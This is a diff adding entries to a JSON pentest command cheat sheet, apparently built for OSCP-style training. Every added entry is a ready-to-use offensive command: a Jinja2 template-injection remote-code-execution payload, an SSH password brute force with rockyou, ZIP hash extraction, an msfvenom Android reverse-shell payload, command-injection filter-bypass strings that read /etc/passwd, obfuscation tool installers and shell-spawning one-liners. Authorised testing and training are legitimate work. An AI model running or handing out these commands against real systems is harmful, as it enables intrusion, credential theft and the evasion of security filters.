@@ -2539,6 +2539,184 @@
         "https://github.com/FreeRDP/FreeRDP"
       ],
       "name": "xfreerdp"
+    },
+    {
+      "command": "{{request.application.__globals__.__builtins__.__import__('os').popen('$COMMAND').read()}}\n",
+      "description": "Server-Side Template Injection (SSTI) RCE payload for Jinja2/Flask template backends.",
+      "os": [
+        "Linux"
+      ],
+      "category": [
+        "cli"
+      ],
+      "phase": [
+        "Exploitation"
+      ],
+      "references": [
+        "https://github.com/zernanvash/cheatsheet/blob/main/guides/Web%20Exploitation%20Playbook.md#211-server-side-template-injection-ssti"
+      ],
+      "name": "ssti-jinja2"
+    },
+    {
+      "command": "medusa -h $IP -U $USERLIST -P /usr/share/wordlists/rockyou.txt -M ssh -t 4\n",
+      "description": "SSH online brute force using Medusa with thread throttling.",
+      "os": [
+        "Linux"
+      ],
+      "category": [
+        "oscp",
+        "cli"
+      ],
+      "service": [
+        "SSH"
+      ],
+      "phase": [
+        "Exploitation"
+      ],
+      "references": [
+        "https://github.com/jofpin/medusa"
+      ],
+      "name": "medusa-ssh"
+    },
+    {
+      "command": "zip2john $FILE > zip.hash\n",
+      "description": "Extract password hashes from encrypted ZIP archives.",
+      "os": [
+        "Linux"
+      ],
+      "category": [
+        "oscp",
+        "cli"
+      ],
+      "phase": [
+        "Enumeration"
+      ],
+      "references": [
+        "https://github.com/openwall/john"
+      ],
+      "name": "zip2john"
+    },
+    {
+      "command": "msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTFILE.apk\n",
+      "description": "Generate an Android reverse TCP APK payload using msfvenom.",
+      "os": [
+        "Linux"
+      ],
+      "category": [
+        "oscp",
+        "cli"
+      ],
+      "phase": [
+        "InitialAccess"
+      ],
+      "references": [
+        "https://github.com/rapid7/metasploit-framework"
+      ],
+      "name": "msfvenom-android"
+    },
+    {
+      "variants": [
+        {
+          "label": "linux-spaces",
+          "command": "cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd\n"
+        },
+        {
+          "label": "windows-slashes",
+          "command": "echo %HOMEPATH:~6,-11%\n"
+        },
+        {
+          "label": "cmd-caret",
+          "command": "who^ami\n"
+        }
+      ],
+      "description": "Evade basic filters and blacklists inside shell command injection inputs.",
+      "os": [
+        "Linux",
+        "Windows"
+      ],
+      "category": [
+        "cli"
+      ],
+      "phase": [
+        "Exploitation"
+      ],
+      "references": [
+        "https://github.com/zernanvash/cheatsheet/blob/main/guides/Web%20Exploitation%20Playbook.md#22-command-injection"
+      ],
+      "name": "cmd-injection-bypass"
+    },
+    {
+      "command": "git clone https://github.com/Bashfuscator/Bashfuscator && cd Bashfuscator && pip3 install setuptools==65 && python3 setup.py install --user\n",
+      "description": "Install Bashfuscator CLI tool to generate heavily obfuscated bash commands.",
+      "os": [
+        "Linux"
+      ],
+      "category": [
+        "cli"
+      ],
+      "phase": [
+        "Exploitation"
+      ],
+      "references": [
+        "https://github.com/Bashfuscator/Bashfuscator"
+      ],
+      "name": "bashfuscator"
+    },
+    {
+      "command": "Import-Module .\\Invoke-DOSfuscation.psd1; Invoke-DOSfuscation\n",
+      "description": "Load Invoke-DOSfuscation shell to generate obfuscated cmd payload parameters.",
+      "os": [
+        "Windows"
+      ],
+      "category": [
+        "cli"
+      ],
+      "phase": [
+        "Exploitation"
+      ],
+      "references": [
+        "https://github.com/danielbohannon/Invoke-DOSfuscation"
+      ],
+      "name": "invoke-dosfuscation"
+    },
+    {
+      "variants": [
+        {
+          "label": "perl",
+          "command": "perl -e 'exec \"/bin/bash\";'\n"
+        },
+        {
+          "label": "ruby",
+          "command": "ruby -e 'exec \"/bin/bash\"'\n"
+        },
+        {
+          "label": "lua",
+          "command": "lua -e 'os.execute(\"/bin/sh\")'\n"
+        },
+        {
+          "label": "awk",
+          "command": "awk 'BEGIN {system(\"/bin/bash\")}'\n"
+        },
+        {
+          "label": "find",
+          "command": "find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;\n"
+        }
+      ],
+      "description": "Upgrade a non-interactive shell to a TTY session using alternative system interpreters.",
+      "os": [
+        "Linux"
+      ],
+      "category": [
+        "oscp",
+        "cli"
+      ],
+      "phase": [
+        "InitialAccess"
+      ],
+      "references": [
+        "https://github.com/zernanvash/cheatsheet/blob/main/guides/Machine%20Exploitation%20Playbook.md#non-python-tty-upgrade-alternatives"
+      ],
+      "name": "tty-upgrade-alt"
     }
   ]
 }
